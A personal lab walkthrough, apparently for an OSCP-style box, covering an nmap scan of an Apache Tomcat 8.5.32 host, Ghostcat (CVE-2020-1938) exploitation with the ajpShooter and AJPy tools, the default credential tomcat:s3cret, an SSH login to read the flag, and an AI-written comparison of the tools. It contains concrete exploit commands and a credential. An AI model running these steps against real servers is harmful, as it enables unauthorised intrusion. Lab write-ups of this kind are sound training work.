
[...back](../0-landing-ncsaoscp.md)

# 1 brief

ip
34.143.155.152
port
8080,80,22,8009

read flag at /root/flag.txt. recommend using Nessus, OpenVAS

`<iptarget> may change due to different instances`

---

# 2 nmap

```
❯ nmap nmap -sC -sV -O -A -T4 34.143.155.152 -p 8080,80,22,8009
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 21:41 +07
Failed to resolve "nmap".
Nmap scan report for 152.155.143.34.bc.googleusercontent.com (34.143.155.152)
Host is up (0.0070s latency).

PORT     STATE  SERVICE VERSION
22/tcp   open   ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 e2:65:41:2a:d9:1b:cf:b3:85:e3:41:a5:40:56:02:ec (RSA)
|   256 f3:02:9f:b8:f4:cb:ab:58:da:53:39:32:35:94:fc:e6 (ECDSA)
|_  256 46:ca:91:c7:59:a5:c3:e4:8f:3b:ae:9b:ac:68:8d:21 (ED25519)
80/tcp   closed http
8009/tcp open   ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open   http    Apache Tomcat 8.5.32
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.32
Device type: bridge|general purpose|VoIP adapter|media device|printer
Running (JUST GUESSING): Oracle Virtualbox (95%), Slirp (95%), QEMU (95%), AT&T embedded (93%), Sanyo embedded (86%), Dell embedded (85%), Wind River VxWorks (85%)
OS CPE: cpe:/o:oracle:virtualbox cpe:/a:danny_gasparovski:slirp cpe:/a:qemu:qemu cpe:/h:sanyo:plc-xu88 cpe:/h:dell:1815dn cpe:/o:windriver:vxworks
Aggressive OS guesses: Oracle Virtualbox Slirp NAT bridge (95%), QEMU user mode network gateway (95%), AT&T BGW210 voice gateway (93%), Sanyo PLC-XU88 digital video projector (86%), Dell 1815dn printer (85%), VxWorks (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.99 ms 152.155.143.34.bc.googleusercontent.com (34.143.155.152)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.69 seconds
```

---

# 3 vuln ass

```
here is brief and nmap result
give vuln ass
```

`#OG`
**Primary Attack Vector:** Apache Tomcat 8.5.32 on port 8080.
**Secondary Vector:** AJP13 on port 8009.

**Vulnerability Analysis:**
1. **Tomcat Version 8.5.32** - Known vulnerabilities:
   - CVE-2019-0232 (RCE via CGI Servlet)
   - Potential manager interface weak/default credentials
   - WAR deployment exploitation

2. **AJP Protocol (port 8009)** - Potential for:
   - Ghostcat vulnerability (CVE-2020-1938) - file read/incusion
   - AJP request smuggling

---

# 4 apjshooter

`wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py`

[fix bugs ... add webapp flag](./assets/ajpShooter-drkb.py)

`python ajpShooter-drkb.py 'http://136.110.0.33:8080/' 8009 /WEB-XML/web.xml --ajp-ip 136.110.54.33 --webapp=manager`

```
can read xml
cannot ready /flag_*.txt

need admin login
```

---

# 5 solution = hypn0s/AJPy

https://github.com/hypn0s/AJPy

`git clone https://github.com/hypn0s/AJPy`
`python tomcat.py read_file --webapp=manager /WEB-INF/web.xml <TARGET>`

>>> tomcat:s3cret

from access denied 403

`ssh tomcat@iptarget`
`cat flag_???.txt`

---

# 6 that 403 secret

[see](./supp/that-403-secret.md)

` By default the Manager is only accessible from a browser running on the same machine as Tomcat.`

> ajpShooter successfully read web.xml, as manager, will not run into 403?
> AJPy failed to access web.xml with http-request as manager

```
i'm finishing writeup

can you give me the summary of ajpshooter vs ajpy
```

`#OG`
`>> TOOL_COMPARISON_SUMMARY._FINAL_ANALYSIS.` 📊⚡

## **AJPy vs ajpShooter: Technical Comparison**

### **ARCHITECTURE DIFFERENCES**

**AJPy (`tomcat.py`):**
- **AJP Protocol Library** - Full AJP protocol implementation
- **HTTP-like Interface** - Makes requests that get processed by Tomcat
- **Returns Web Responses** - Gets what a browser would see (HTML, 403 pages)
- **Brute Force Capable** - Can test credentials via AJP

**ajpShooter:**
- **Ghostcat Exploit Tool** - Specifically for CVE-2020-1938
- **File Inclusion Attack** - Uses `javax.servlet.include.*` attributes
- **Raw File Access** - Bypasses web processing, reads files directly
- **Limited to File Reading** - No authentication or request capabilities

### **BEHAVIOR DIFFERENCES**

| Aspect | AJPy | ajpShooter |
|--------|------|------------|
| **Request Type** | Normal AJP requests | Ghostcat file inclusion |
| **Response** | Processed web pages | Raw file content |
| **403 Access Denied** | Shows HTML error page | Reads files anyway |
| **Manager Access** | Gets blocked (normal) | Reads config files (exploit) |
| **Credentials** | Shows examples in errors | Can read actual configs |

### **USE CASE ANALYSIS**

**Use AJPy when:**
- Testing manager credentials via AJP
- Making normal AJP requests
- Brute force attacks on protected resources
- Need HTTP-like behavior through AJP

**Use ajpShooter when:**
- Exploiting Ghostcat vulnerability
- Reading files within webapp context
- Bypassing web server restrictions
- File inclusion attacks

### **KEY TECHNICAL INSIGHT**

**AJPy's 403 Response:**
```python
# Makes normal request, gets processed response
perform_request("/manager/html") → 403 HTML page
```

**ajpShooter's File Read:**
```python
# Uses Ghostcat to read files directly  
include_attributes → raw file content
```

### **PRACTICAL IMPACT**

**For This OSCP Lab:**
- **AJPy revealed** the manager exists but is properly secured
- **ajpShooter proved** Ghostcat works but can't reach `/root/flag.txt`
- **The "solution"** was finding default credentials in the 403 error page example

### **LEARNING OUTCOME**

**Ghostcat Limitations:**
- Can read files **within web application scope**
- Cannot access **arbitrary system files**
- Limited by **Tomcat security context**

**Tool Selection Matters:**
- Different tools = different attack vectors
- Understand what each tool actually does
- Choose based on objective

*Two tools, one protocol, different results. The right tool depends on the target's defenses.* 🛠️🔓

**Final Note:** In this case, neither tool alone got the root flag - but understanding both led to the solution path.

---

[...back](../0-landing-ncsaoscp.md)
